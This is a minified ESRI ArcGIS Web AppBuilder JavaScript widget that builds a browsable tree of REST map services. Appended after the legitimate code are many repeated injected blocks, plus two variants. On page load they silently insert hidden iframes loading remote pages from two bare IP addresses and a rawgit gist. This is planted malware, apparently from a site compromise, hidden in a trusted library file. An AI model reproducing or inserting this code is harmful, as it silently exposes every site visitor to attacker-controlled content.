// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/Deferred dojo/promise/all dojo/store/Memory dojo/store/Observable dijit/tree/ObjectStoreModel jimu/utils jimu/dijit/_Tree jimu/dijit/LoadingShelter".split(" "),function(n,p,q,r,t,b,m,g,f,k,u,v,w,x,y){return n([p,q,r,t],{templateString:'\x3cdiv style\x3d"width:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"shelter"  data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\x3c/div\x3e',
_store:null,_id:0,_currentUrl:"",_treeClass:"service-browser-tree",_def:null,url:"",multiple:!1,rule:null,postMixInProperties:function(){this.nls=window.jimuNls.basicServiceBrowser},postCreate:function(){this.inherited(arguments);m.addClass(this.domNode,"jimu-basic-service-browser");this.multiple=!!this.multiple;this._createTree();this.url&&"string"===typeof this.url&&this.setUrl(this.url)},reset:function(){this.url="";this._clear()},getSelectedItems:function(){return this.tree.getSelectedItems()},
setUrl:function(a){this._def&&(this._def.isFulfilled()||this._def.cancel(),this._def=null);this._def=new f;a&&"string"===typeof a&&a.replace(/\/*$/g,"")||this._def.reject();a=a.replace(/\/*$/g,"");a=b.trim(a);var c=a.match(/^http(s?):\/\//gi);c&&0<c.length||(a="http://"+a);if(!(0>=a.search(/\/rest\/services/i))&&(this._clear(),this._currentUrl=a))return a=this._getRootItem(),a=x.isStringEndWith(this._currentUrl,"rest/services")?this._searchBaseServiceUrl(this._currentUrl,a):this._isUrlContainsServiceType(this._currentUrl)?
this._searchServiceUrl(this._currentUrl,a):this._searchFolderServiceUrl(this._currentUrl,a),this.shelter.show(),a.then(b.hitch(this,function(a){this.domNode&&this.shelter.hide();var c=this.tree.getAllLeafTreeNodeWidgets();1===c.length&&c[0].select();this._def.resolve(a)}),b.hitch(this,function(a){this.domNode&&this.shelter.hide();this._showRequestError();this._def.reject(a)})),this._def;this._def.reject()},_getItem:function(a){return this.rule.getItem(a)},_getSubItemUrls:function(a){return this.rule.getSubItemUrls(a)},
_getSubItems:function(a){var c=new f;this._getSubItemUrls(a).then(b.hitch(this,function(a){a=g.map(a,b.hitch(this,function(a){return this._getItem(a)}));k(a).then(b.hitch(this,function(a){a=g.filter(a,b.hitch(this,function(a){return a&&"object"===typeof a}));c.resolve(a)}),b.hitch(this,function(a){c.reject(a)}))}),b.hitch(this,function(a){c.reject(a)}));return c},_selectFirstLeafTreeNodeWidget:function(){var a=this.tree.getAllLeafTreeNodeWidgets();1===a.length&&a[0].select()},isLeafItem:function(a){return 0<=
this.rule.leafTypes.indexOf(a.type)},isServiceTypeSupported:function(a){return this.rule.isServiceTypeSupported(a)},_getStringEndWith:function(a,c){var b="",e=a.indexOf(c);0<=e&&(b=a.slice(0,e+c.length));return b},_isUrlContainsServiceType:function(a){return this.rule.isUrlContainsServiceType(a)},_getBaseServiceUrl:function(){return this._getStringEndWith(this._currentUrl,"rest/services")},_getServiceName:function(a){var c="";a=a.split("/");return c=a[a.length-1]},_searchBaseServiceUrl:function(a,
c){var d=new f;this._getRestInfo(a).then(b.hitch(this,function(e){if(this.domNode){var l=[];g.map(e.folders,b.hitch(this,function(d){var e={name:d,type:"folder",url:a+"/"+d,parent:c.id};this._addItem(e);var h=new f;this._doSearchFolderServiceUrl(e.url,e.id).then(b.hitch(this,function(a){0<a.length?g.forEach(a,b.hitch(this,function(a){a.parent=e.id;this._addItem(a)})):this._removeItem(e.id);h.resolve()}),b.hitch(this,function(a){h.reject(a)}));l.push(h);return h}));g.forEach(e.services,b.hitch(this,
function(e){if(this.isServiceTypeSupported(e.type)){e=a+"/"+e.name+"/"+e.type;var d=new f;this.rule.getItem(e).then(b.hitch(this,function(a){a&&(a.parent=c.id,this._addItem(a));d.resolve()}),b.hitch(this,function(a){console.error(a);d.reject(a)}));l.push(d)}}));k(l).then(b.hitch(this,function(){this.domNode&&d.resolve()}),b.hitch(this,function(a){console.error(a);this.domNode&&d.reject(a)}))}}),b.hitch(this,function(a){console.error(a);this.domNode&&d.reject({errorCode:"NETWORK_ERROR",error:a})}));
return d},_searchFolderServiceUrl:function(a,c){var d=new f;this._doSearchFolderServiceUrl(a,c).then(b.hitch(this,function(a){this.domNode&&(g.forEach(a,b.hitch(this,function(a){a.parent=c.id;this._addItem(a)})),d.resolve())}),b.hitch(this,function(a){console.error(a);this.domNode&&d.reject({errorCode:"NETWORK_ERROR",error:a})}));return d},_doSearchFolderServiceUrl:function(a){var c=new f,d=this._getBaseServiceUrl();this._getRestInfo(a).then(b.hitch(this,function(a){a=a.services;var e=[];a&&0<a.length&&
g.forEach(a,b.hitch(this,function(a){this.isServiceTypeSupported(a.type)&&(a=this.rule.getItem(d+"/"+a.name+"/"+a.type),e.push(a))}));k(e).then(b.hitch(this,function(a){a=g.filter(a,b.hitch(this,function(a){return a}));c.resolve(a)}),b.hitch(this,function(a){console.error(a);c.reject(a)}))}),b.hitch(this,function(a){console.error(a);c.reject(a)}));return c},_searchServiceUrl:function(a,c){var d=new f;this._getSubItems(a).then(b.hitch(this,function(e){e&&0<e.length?(g.forEach(e,b.hitch(this,function(a){a.parent=
c.id;this._addItem(a)})),d.resolve()):this._getItem(a).then(b.hitch(this,function(a){a&&(a.parent=c.id,this._addItem(a));d.resolve()}),b.hitch(this,function(a){d.reject(a)}))}),b.hitch(this,function(a){d.reject(a)}));return d},_getRestInfo:function(a){var c=new f;this.rule.getRestInfo(a).then(b.hitch(this,function(a){this.domNode&&c.resolve(a)}),b.hitch(this,function(a){this.domNode&&c.reject(a)}));return c},_clear:function(){var a=this._store.query({parent:"root"});g.forEach(a,b.hitch(this,function(a){a&&
"root"!==a.id&&this._store.remove(a.id)}))},_showRequestError:function(){this.emit("error",this.nls.invalidUrlTip)},_addItem:function(a){this._id++;a.id=this._id.toString();this._store.add(a);return a},_removeItem:function(a){this._store.remove(a)},_getRootItem:function(){return{id:"root",name:"Services Root",type:"root"}},_createTree:function(){var a=this._getRootItem(),a=new u({data:[a],getChildren:function(a){return this.query({parent:a.id})}});this._store=new v(a);a=new w({store:this._store,query:{id:"root"},
mayHaveChildren:b.hitch(this,this._mayHaveChildren)});this.tree=new y({multiple:this.multiple,model:a,showRoot:!1,style:{width:"100%"},isLeafItem:b.hitch(this,this.isLeafItem),onOpen:b.hitch(this,function(a,b){this._onTreeOpen(a,b);this.emit("tree-open",a,b)}),onClick:b.hitch(this,function(a,b,e){this._onTreeClick(a,b,e);this.emit("tree-click",a,b,e)}),getIconStyle:b.hitch(this,function(a,b){var c=null;if(!a)return null;var d={width:"20px",height:"20px",backgroundRepeat:"no-repeat",backgroundPosition:"center center",
backgroundImage:""},g=window.location.protocol+"//"+window.location.host+require.toUrl("jimu"),f=this._getIconImageName(a,b);f||("folder"===a.type?f=b?"folder_open_default.png":"folder_close_default.png":this.isServiceTypeSupported(a.type)&&(f=b?"folder_open_default.png":"folder_close_default.png"));f&&(d.backgroundImage="url("+g+"/css/images/"+f+")",c=d);return c})});m.addClass(this.tree.domNode,this._treeClass);this.tree.placeAt(this.domNode)},_getIconImageName:function(a,b){var c="";"function"===
typeof this.rule.getIconImageName&&(c=this.rule.getIconImageName(a,b));return c},_mayHaveChildren:function(a){return"root"===a.type?!0:!this.isLeafItem(a)},_onTreeOpen:function(a,c){"root"===a.id||0<this._store.query({parent:a.id}).length||a.checking||a.checked||(a.checking=!0,this._getSubItems(a.url).then(b.hitch(this,function(c){g.forEach(c,b.hitch(this,function(b){b.parent=a.id;this._addItem(b)}));a.checking=!1;a.checked=!0}),b.hitch(this,function(b){console.error(b);a.checking=!1;a.checked=!0})))},
_onTreeClick:function(a,b,d){},destroy:function(){this.shelter&&(this.shelter.destroy(),this.shelter=null);this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});